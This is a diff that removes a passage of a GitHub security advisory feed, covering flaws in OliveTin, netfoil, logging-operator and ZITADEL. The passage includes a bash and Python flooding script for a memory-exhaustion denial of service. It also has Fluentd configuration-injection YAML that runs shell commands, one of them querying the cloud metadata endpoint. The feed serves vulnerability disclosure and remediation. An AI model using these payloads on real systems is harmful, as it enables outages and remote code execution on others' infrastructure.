-</code></pre>
-<p>The UTF-16LE formatting is from Windows <code>echo</code>, but the key result is that the response returned the real command output even though the caller's ACL explicitly denied log access.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Bypass of log confidentiality controls:</strong> Operators may configure actions to be executable but not log-readable. The <code>...AndWait</code> endpoints break that separation.</li>
-<li><strong>Disclosure of secrets printed by actions:</strong> Many OliveTin actions wrap administrative scripts and commands whose stdout/stderr may contain credentials, internal paths, hostnames, tokens, or sensitive operational data.</li>
-<li><strong>Adjacent to previous output-leak bugs:</strong> OliveTin already had an EventStream output disclosure bug. This is a separate response-path authorization gap on the synchronous execution APIs.</li>
-</ul>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Enforce <code>logs</code> permission before returning <code>LogEntry</code> content from synchronous execution endpoints.</p>
-<p>Two reasonable fixes:</p>
-<ol>
-<li>Deny the endpoint response when <code>logs:false</code></li>
-</ol>
-<pre><code class="language-go">if !acl.IsAllowedLogs(api.cfg, user, binding.Action) {
-    return nil, connect.NewError(connect.CodePermissionDenied, fmt.Errorf("permission denied to view action output"))
-}
-</code></pre>
-<ol start="2">
-<li>Or redact log-bearing fields when <code>logs:false</code></li>
-</ol>
-<pre><code class="language-go">pb := api.internalLogEntryToPb(internalLogEntry, user)
-if !acl.IsAllowedLogs(api.cfg, user, binding.Action) {
-    pb.Output = ""
-    pb.ExitCode = 0
-}
-return connect.NewResponse(&amp;apiv1.StartActionAndWaitResponse{LogEntry: pb}), nil
-</code></pre>
-<p>The same fix should be applied to both:</p>
-<ul>
-<li><code>StartActionAndWait</code></li>
-<li><code>StartActionByGetAndWait</code></li>
-</ul>
-<h2 id="references">References</h2>
-<ul>
-<li><code>service/internal/api/api.go</code></li>
-<li><code>service/internal/config/config.go</code></li>
-<li><code>service/internal/acl/acl.go</code></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/OliveTin/OliveTin/security/advisories/GHSA-jm28-2wcr-qf3h">https://github.com/OliveTin/OliveTin/security/advisories/GHSA-jm28-2wcr-qf3h</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67439">https://nvd.nist.gov/vuln/detail/CVE-2026-67439</a></li>
-<li><a href="https://github.com/OliveTin/OliveTin/commit/e421780c9885aa5024d2f47b4ed4898f2f18eb90">https://github.com/OliveTin/OliveTin/commit/e421780c9885aa5024d2f47b4ed4898f2f18eb90</a></li>
-<li><a href="https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0">https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-jm28-2wcr-qf3h">https://github.com/advisories/GHSA-jm28-2wcr-qf3h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jm28-2wcr-qf3h</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-30T14:25:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/OliveTin/OliveTin] OliveTin: Unauthenticated DoS via OAuth2 State Memory Exhaustion (Unbounded Map Growth)]]></title>
-        <id>https://github.com/advisories/GHSA-xpxj-f2fm-rqch</id>
-        <link href="https://github.com/advisories/GHSA-xpxj-f2fm-rqch"/>
-        <updated>2026-07-30T14:24:55.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>OliveTin's OAuth2 login handler stores per-login state in an in-memory map (<code>registeredStates</code>) that grows unboundedly. States are added on every <code>/oauth/login</code> request but are <strong>never deleted or expired</strong>. An unauthenticated attacker can send millions of requests to <code>/oauth/login</code> to fill the map with state entries, exhausting server memory and causing a denial of service.</p>
-<p>This is <strong>distinct from CVE-2026-28789</strong> (concurrent map writes crash). That CVE was about the panic from unsynchronized map access — the fix added a <code>sync.RWMutex</code>. This vulnerability is about the <strong>unbounded growth</strong> of the map even WITH the mutex, as no cleanup mechanism exists.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li>All versions with OAuth2 support, including &gt;= 3000.10.3 (which patched CVE-2026-28789)</li>
-</ul>
-<h2 id="details">Details</h2>
-<p>In <code>service/internal/auth/otoauth2/restapi_auth_oauth2.go</code>:</p>
-<pre><code class="language-go">type OAuth2Handler struct {
-    cfg                 *config.Config
-    mu                  sync.RWMutex
-    registeredStates    map[string]*oauth2State  // NEVER cleaned up
-    registeredProviders map[string]*oauth2.Config
-}
-</code></pre>
-<p>The <code>HandleOAuthLogin</code> handler adds a new state on every request:</p>
-<pre><code class="language-go">func (h *OAuth2Handler) HandleOAuthLogin(w http.ResponseWriter, r *http.Request) {
-    state, _ := randString(16)  // 24-byte base64 string
-    // ...
-    h.mu.Lock()
-    h.registeredStates[state] = &amp;oauth2State{
-        providerConfig: provider,
-        providerName:   providerName,
-        Username:       "",
-    }
-    h.mu.Unlock()
-    // ... redirect to OAuth2 provider
-}
-</code></pre>
-<p>The <code>HandleOAuthCallback</code> handler updates existing states but never removes them:</p>
-<pre><code class="language-go">func (h *OAuth2Handler) HandleOAuthCallback(w http.ResponseWriter, r *http.Request) {
-    // ...
-    h.mu.Lock()
-    h.registeredStates[state].Username = userinfo.Username  // Updates, never deletes
-    h.registeredStates[state].Usergroup = ...
-    h.mu.Unlock()
-}
-</code></pre>
-<p>There is <strong>no TTL, no expiry check, no periodic cleanup, and no max size limit</strong> on <code>registeredStates</code>.</p>
-<h3 id="memory-impact-per-state">Memory Impact Per State</h3>
-<p>Each map entry consists of:</p>
-<ul>
-<li>Key: ~24 bytes (base64 string)</li>
-<li>Value: <code>*oauth2State</code> struct containing:<ul>
-<li><code>providerConfig *oauth2.Config</code> (pointer, 8 bytes + shared config)</li>
-<li><code>providerName string</code> (~8-16 bytes)</li>
-<li><code>Username string</code> (empty initially)</li>
-<li><code>Usergroup string</code> (empty initially)</li>
-</ul>
-</li>
-<li>Go map overhead: ~100-150 bytes per entry</li>
-</ul>
-<p>Estimated: <strong>~200 bytes per state entry</strong></p>
-<p>At 1 million states ≈ <strong>200 MB</strong> of memory consumed.
-At 10 million states ≈ <strong>2 GB</strong> of memory consumed.</p>
-<h3 id="attack-vector">Attack Vector</h3>
-<p>The <code>/oauth/login</code> endpoint is publicly accessible (unauthenticated). Each request is lightweight (no heavy computation like argon2). The server writes a cookie and returns a 302 redirect. An attacker can send thousands of requests per second.</p>
-<h2 id="poc">PoC</h2>
-<h3 id="prerequisites">Prerequisites</h3>
-<ul>
-<li>OliveTin instance with at least one OAuth2 provider configured</li>
-<li>Network access to <code>/oauth/login</code></li>
-</ul>
-<h3 id="config">Config</h3>
-<pre><code class="language-yaml">listenAddressSingleHTTPFrontend: 0.0.0.0:1337
-logLevel: "INFO"
-checkForUpdates: false
-
-authOAuth2RedirectUrl: "http://127.0.0.1:1337/oauth/callback"
-authOAuth2Providers:
-  github:
-    clientId: "test-client-id"
-    clientSecret: "test-client-secret"
-
-actions:
-  - title: noop
-    shell: echo "ok"
-</code></pre>
-<h3 id="step-1-baseline-health-check">Step 1: Baseline health check</h3>
-<pre><code class="language-bash">curl -i http://127.0.0.1:1337/readyz
-# Expected: 200 OK
-
-curl -I "http://127.0.0.1:1337/oauth/login?provider=github"
-# Expected: 302 Found (redirect to GitHub)
-</code></pre>
-<h3 id="step-2-flood-with-state-creation-requests">Step 2: Flood with state-creation requests</h3>
-<pre><code class="language-bash"># Each request creates a new map entry that is never cleaned up
-for i in $(seq 1 100000); do
-  curl -s -o /dev/null "http://127.0.0.1:1337/oauth/login?provider=github" &amp;
-  # Throttle to avoid connection limits
-  if (( i % 500 == 0 )); then
-    wait
-    echo "Sent $i requests..."
-  fi
-done
-wait
-echo "Flood complete"
-</code></pre>
-<h3 id="step-3-python-poc-for-sustained-memory-exhaustion">Step 3: Python PoC for sustained memory exhaustion</h3>
-<pre><code class="language-python">#!/usr/bin/env python3
-"""PoC: OAuth2 State Memory Exhaustion DoS
-
-Distinct from CVE-2026-28789 (concurrent map crash).
-This exploits unbounded growth of the registeredStates map.
-"""
-
-import requests
-import time
-import sys
-from concurrent.futures import ThreadPoolExecutor
-
-TARGET = "http://127.0.0.1:1337"
-PROVIDER = "github"
-WORKERS = 50
-TOTAL_REQUESTS = 500000
-BATCH_SIZE = 1000
-
-def create_state(_):
-    """Send /oauth/login to create a new state entry."""
-    try:
-        requests.get(
-            f"{TARGET}/oauth/login?provider={PROVIDER}",
-            allow_redirects=False,
-            timeout=5
-        )
-        return True
-    except Exception:
-        return False
-
-def check_health():
-    """Check if the server is still responsive."""
-    try:
-        r = requests.get(f"{TARGET}/readyz", timeout=5)
-        return r.status_code == 200
-    except Exception:
-        return False
-
-print(f"[*] Target: {TARGET}")
-print(f"[*] Provider: {PROVIDER}")
-print(f"[*] Total requests: {TOTAL_REQUESTS}")
-print(f"[*] Workers: {WORKERS}")
-print()
-
-if not check_health():
-    print("[!] Server not reachable")
-    sys.exit(1)
-
-start_time = time.time()
-total_created = 0
-
-with ThreadPoolExecutor(max_workers=WORKERS) as executor:
-    for batch_start in range(0, TOTAL_REQUESTS, BATCH_SIZE):
-        batch_end = min(batch_start + BATCH_SIZE, TOTAL_REQUESTS)
-        results = list(executor.map(create_state, range(batch_start, batch_end)))
-        total_created += sum(results)
-
-        elapsed = time.time() - start_time
-        rate = total_created / elapsed if elapsed &gt; 0 else 0
-        est_memory = total_created * 200 / 1024 / 1024  # MB
-
-        print(f"  States created: {total_created:&gt;8} | "
-              f"Rate: {rate:&gt;6.0f}/s | "
-              f"Est. memory: {est_memory:&gt;6.1f} MB | "
-              f"Healthy: {check_health()}")
-
-        if not check_health():
-            print(f"\n[!] Server became unresponsive after {total_created} states!")
-            print(f"[!] Estimated memory consumed: {est_memory:.1f} MB")
-            break
-
-print(f"\n[*] Attack complete. {total_created} states created in {time.time()-start_time:.1f}s")
-</code></pre>
-<h3 id="step-4-verify-memory-growth-docker">Step 4: Verify memory growth (Docker)</h3>
-<pre><code class="language-bash">docker stats olivetin-instance --no-stream
-# Observe MEM USAGE growing continuously during the attack
-</code></pre>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Who is impacted:</strong> All OliveTin deployments with any OAuth2 provider configured</li>
-<li><strong>Attack requirements:</strong> Unauthenticated network access to <code>/oauth/login</code></li>
-<li><strong>Effect:</strong> Gradual memory exhaustion leading to OOM kill or service degradation</li>
-<li><strong>Persistence:</strong> Memory is never reclaimed (states are never deleted) even after the attack stops — a restart is required</li>
-<li><strong>Distinction from CVE-2026-28789:</strong> That CVE was a race condition crash (concurrent map writes). This is unbounded memory growth that persists even with the mutex fix applied.</li>
-</ul>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<ol>
-<li>Add a TTL to OAuth2 states (e.g., 15 minutes matching the cookie <code>MaxAge</code>)</li>
-<li>Add a maximum state count (e.g., 10,000) with LRU eviction</li>
-<li>Clean up states after successful callback</li>
-<li>Add periodic garbage collection for expired states</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/OliveTin/OliveTin/security/advisories/GHSA-xpxj-f2fm-rqch">https://github.com/OliveTin/OliveTin/security/advisories/GHSA-xpxj-f2fm-rqch</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67437">https://nvd.nist.gov/vuln/detail/CVE-2026-67437</a></li>
-<li><a href="https://github.com/OliveTin/OliveTin/commit/ec114e95d297b806c3ca0c37bc139b3c9c517b3f">https://github.com/OliveTin/OliveTin/commit/ec114e95d297b806c3ca0c37bc139b3c9c517b3f</a></li>
-<li><a href="https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0">https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-xpxj-f2fm-rqch">https://github.com/advisories/GHSA-xpxj-f2fm-rqch</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xpxj-f2fm-rqch</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-30T14:24:53.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/tinfoil-factory/netfoil] netfoil: Incorrect block responses could lead to localhost traffic]]></title>
-        <id>https://github.com/advisories/GHSA-xvg2-cgv6-6h7v</id>
-        <link href="https://github.com/advisories/GHSA-xvg2-cgv6-6h7v"/>
-        <updated>2026-07-29T17:03:48.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>0.0.0.0</code> was used instead of NXDOMAIN for block responses. On Linux, which is the target platform for netfoil, the <code>0.0.0.0</code> is sent to localhost rather than just dropped.</p>
-<h3 id="impact">Impact</h3>
-<p>Unintended traffic could be sent to localhost. Impact depends on running services and firewall rules.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/tinfoil-factory/netfoil/security/advisories/GHSA-xvg2-cgv6-6h7v">https://github.com/tinfoil-factory/netfoil/security/advisories/GHSA-xvg2-cgv6-6h7v</a></li>
-<li><a href="https://github.com/tinfoil-factory/netfoil/pull/33">https://github.com/tinfoil-factory/netfoil/pull/33</a></li>
-<li><a href="https://github.com/tinfoil-factory/netfoil/commit/891d3513c77999a9deef9f23506807d9653ee448">https://github.com/tinfoil-factory/netfoil/commit/891d3513c77999a9deef9f23506807d9653ee448</a></li>
-<li><a href="https://github.com/tinfoil-factory/netfoil/releases/tag/v0.4.0">https://github.com/tinfoil-factory/netfoil/releases/tag/v0.4.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-xvg2-cgv6-6h7v">https://github.com/advisories/GHSA-xvg2-cgv6-6h7v</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xvg2-cgv6-6h7v</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-29T17:03:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/kube-logging/logging-operator] Logging operator has Fluentd configuration injection that allows remote code execution]]></title>
-        <id>https://github.com/advisories/GHSA-mjqf-28ph-426h</id>
-        <link href="https://github.com/advisories/GHSA-mjqf-28ph-426h"/>
-        <updated>2026-07-29T17:01:29.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Fluentd configuration renderer in Logging operator writes strings from CRDs such as <code>Flow</code> directly into <code>fluent.conf</code> without escaping them. As a result, a user who can create <code>Flow</code> resources can inject Fluentd configuration by providing values that contain newlines.</p>
-<p>In the confirmed path, a value in <code>record_transformer.records</code> can close the current <code>&lt;record&gt;</code> / <code>&lt;filter&gt;</code> block and add a new <code>&lt;match **&gt;</code> block. By specifying Fluentd's core <code>@type exec</code> plugin in that injected block, an attacker can execute arbitrary commands inside the Fluentd aggregator.</p>
-<h3 id="details">Details</h3>
-<p>The issue is in <code>FluentRender</code> in <code>pkg/sdk/logging/model/render/fluent.go</code>.</p>
-<p><a href="https://github.com/kube-logging/logging-operator/blob/98275d2984aa8d731c4c975b8006aa433fc7bafa/pkg/sdk/logging/model/render/fluent.go#L60-L87">https://github.com/kube-logging/logging-operator/blob/98275d2984aa8d731c4c975b8006aa433fc7bafa/pkg/sdk/logging/model/render/fluent.go#L60-L87</a></p>
-<p>Each parameter is rendered as <code>key value</code>, but values are not quoted, and newlines or characters such as <code>&lt;</code> and <code>&gt;</code> are not rejected. In addition, <code>indentedf</code> builds the string with <code>fmt.Sprintf</code> and then splits it on <code>\n</code>, so newlines inside CRD values become new lines in the generated Fluentd configuration.</p>
-<p>One input source is <code>record_transformer.records</code>. <code>ToDirective</code> passes <code>Record</code> (<code>map[string]string</code>) into <code>Params</code> without validation or escaping.</p>
-<p><a href="https://github.com/kube-logging/logging-operator/blob/98275d2984aa8d731c4c975b8006aa433fc7bafa/pkg/sdk/logging/model/filter/record_transformer.go#L92-L103">https://github.com/kube-logging/logging-operator/blob/98275d2984aa8d731c4c975b8006aa433fc7bafa/pkg/sdk/logging/model/filter/record_transformer.go#L92-L103</a></p>
-<p>The config check in <code>pkg/resources/fluentd/appconfigmap.go</code> runs <code>fluentd -c ... --dry-run</code>, but it passes as long as the injected configuration is syntactically valid Fluentd configuration. <code>@type exec</code> is a core Fluentd plugin and is available in the official Fluentd image.</p>
-<h3 id="poc">PoC</h3>
-<p>The prerequisite is that Logging operator is running with a Fluentd aggregator configuration and that the attacker can create <code>Flow</code> and <code>Output</code> resources in a watched namespace, for example <code>tenant-a</code>.</p>
-<p>First, create a minimal <code>Output</code> as the log destination.</p>
-<pre><code class="language-yaml">apiVersion: logging.banzaicloud.io/v1beta1
-kind: Output
-metadata:
-  name: sink
-  namespace: tenant-a
-spec:
-  nullout: {}
-</code></pre>
-<p>Next, create a <code>Flow</code> whose <code>record_transformer.records</code> value contains an injected <code>@type exec</code> block.</p>
-<pre><code class="language-yaml">apiVersion: logging.banzaicloud.io/v1beta1
-kind: Flow
-metadata:
-  name: exfil
-  namespace: tenant-a
-spec:
-  match:
-    - select: {}
-  filters:
-    - record_transformer:
-        records:
-          - x: |-
-              y
-              &lt;/record&gt;
-              &lt;/filter&gt;
-              &lt;match **&gt;
-                @type exec
-                command /bin/sh -c "id &gt; /tmp/pwned"
-                &lt;format&gt;
-                  @type json
-                &lt;/format&gt;
-                &lt;buffer&gt;
-                  flush_interval 1s
-                &lt;/buffer&gt;
-              &lt;/match&gt;
-              &lt;filter dummy.**&gt;
-                @type record_transformer
-                &lt;record&gt;
-                  absorbed y
-  localOutputRefs:
-    - sink
-</code></pre>
-<p>After applying the manifests, the Fluentd configuration Secret generated by the operator contains <code>@type exec</code>.</p>
-<pre><code class="language-sh">kubectl apply -f output.yaml -f flow.yaml
-
-kubectl -n &lt;control-namespace&gt; get secret &lt;logging&gt;-fluentd-app \
-  -o go-template='{{ index .data "fluentd.conf" }}' \
-  | base64 -d | grep -A8 '@type exec'
-</code></pre>
-<p>When any Pod in <code>tenant-a</code> emits logs, those logs flow into the injected <code>&lt;match **&gt;</code> block. When <code>out_exec</code> flushes its buffer, the command is executed and can be confirmed as follows.</p>
-<pre><code class="language-sh">kubectl -n &lt;control-namespace&gt; exec &lt;fluentd-aggregator-pod&gt; -- cat /tmp/pwned
-# expected:
-uid=100(fluent) gid=101(fluent) groups=101(fluent)
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>This is remote code execution (RCE) against the Fluentd aggregator managed by Logging operator.
-Because the Fluentd aggregator collects and routes logs for namespaces / tenants in the Logging domain, a user who can create <code>Flow</code> / <code>Output</code> resources in one namespace can execute arbitrary commands inside the shared aggregator.</p>
-<p>In environments such as AWS EKS, the Fluentd Pod may be able to reach the node's Instance Metadata Service (IMDS). This was confirmed on EKS 1.35. The core issue is arbitrary command execution, so the same class of attack is possible even when IMDSv2 is required. The following <code>Flow</code> example uses IMDSv1 only to make reachability easy to demonstrate.</p>
-<pre><code class="language-yaml">apiVersion: logging.banzaicloud.io/v1beta1
-kind: Flow
-metadata:
-  name: imds-poc
-  namespace: tenant-a
-spec:
-  match:
-    - select: {}
-  filters:
-    - record_transformer:
-        records:
-          - x: |-
-              y
-              &lt;/record&gt;
-              &lt;/filter&gt;
-              &lt;match **&gt;
-                @type exec
-                command /bin/sh -c "curl -sS http://169.254.169.254/latest/meta-data/instance-id -o /tmp/imds-poc"
-                &lt;format&gt;
-                  @type json
-                &lt;/format&gt;
-                &lt;buffer&gt;
-                  flush_interval 1s
-                &lt;/buffer&gt;
-              &lt;/match&gt;
-              &lt;filter dummy.**&gt;
-                @type record_transformer
-                &lt;record&gt;
-                  absorbed y
-  localOutputRefs:
-    - sink
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/kube-logging/logging-operator/security/advisories/GHSA-mjqf-28ph-426h">https://github.com/kube-logging/logging-operator/security/advisories/GHSA-mjqf-28ph-426h</a></li>
-<li><a href="https://github.com/kube-logging/logging-operator/commit/cf437d7f1e056c78740bf5716ac8bdebcf002425">https://github.com/kube-logging/logging-operator/commit/cf437d7f1e056c78740bf5716ac8bdebcf002425</a></li>
-<li><a href="https://github.com/kube-logging/logging-operator/releases/tag/6.6.0">https://github.com/kube-logging/logging-operator/releases/tag/6.6.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-mjqf-28ph-426h">https://github.com/advisories/GHSA-mjqf-28ph-426h</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mjqf-28ph-426h</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-29T17:01:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL Users Can Self-Verify Email/Phone via API]]></title>
-        <id>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</id>
-        <link href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9"/>
-        <updated>2026-07-29T16:54:53.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A vulnerability in Zitadel's self-management capability allowed users to mark their email and phone as verified without going through an actual verification process.</p>
-<p>While <a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-282g-fhmx-xf54"><code>GHSA-282g-fhmx-xf54</code></a> (CVE-2026-27946, "Users Can Self-Verify Email/Phone via UpdateHumanUser API") closed the path that let any authenticated user mark an arbitrary email or phone as verified on their own account by calling <code>UpdateHumanUser</code> with <code>email.is_verified: true</code>, additional paths were discovered.</p>
-<h3 id="impact">Impact</h3>
-<p>Zitadel provides an API for managing users. The API also allows users to self-manage their own data including updating the email and phone.</p>
-<p>Due to an improper permission check, the API allowed returning the verification code for the email and phone to the own user.
-This allows users to claim ownership of an email or phone they do not control and potentially bypass email-based security policies.</p>
-<p>Note that when changing another user's email or phone, regardless of the verification flag, the permissions were correctly checked.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Systems running one of the following versions are affected:</p>
-<ul>
-<li><strong>4.x</strong>: <code>4.0.0</code> through <code>4.15.0</code> (including RC versions)</li>
-<li><strong>3.x</strong>: <code>3.0.0</code> through <code>3.4.10</code> (including RC versions)</li>
-<li><strong>2.x</strong>: <code>2.43.0</code> through <code>2.71.19</code></li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>The vulnerability has been addressed in the latest releases. The patch resolves the issue by requiring the correct permission in case the verification flag is provided and only allows self-management of the email address, resp. phone number itself.</p>
-<p>4.x: Upgrade to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">4.15.1</a>
-3.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a>
-2.x: Update to &gt;=<a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">3.4.11</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>The recommended solution is to upgrade to a patched version. If an upgrade is not possible, an action (v2) could be used to prevent returning the verification code to the own user.</p>
-<h3 id="questions">Questions</h3>
-<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
-<h3 id="credits">Credits</h3>
-<p>Thanks to <a href="https://github.com/eddieran">eddieran</a> for reporting this vulnerability.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/zitadel/zitadel/security/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
-<li><a href="https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d">https://github.com/zitadel/zitadel/commit/90f310212d3a5075084a603bf61fed549c92956d</a></li>
-<li><a href="https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151">https://github.com/zitadel/zitadel/commit/a1748b2f0326ddf7be0de44b4f980ae2c07c0151</a></li>
-<li><a href="https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f">https://github.com/zitadel/zitadel/commit/ed09b3df7f43e870423e4d8f2757e6894481604f</a></li>
-<li><a href="https://github.com/zitadel/zitadel/releases/tag/v3.4.11">https://github.com/zitadel/zitadel/releases/tag/v3.4.11</a></li>
-<li><a href="https://github.com/zitadel/zitadel/releases/tag/v4.15.1">https://github.com/zitadel/zitadel/releases/tag/v4.15.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-jq8w-8q2f-ffm9">https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jq8w-8q2f-ffm9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-29T16:54:49.000Z</published>
     </entry>
 </feed>
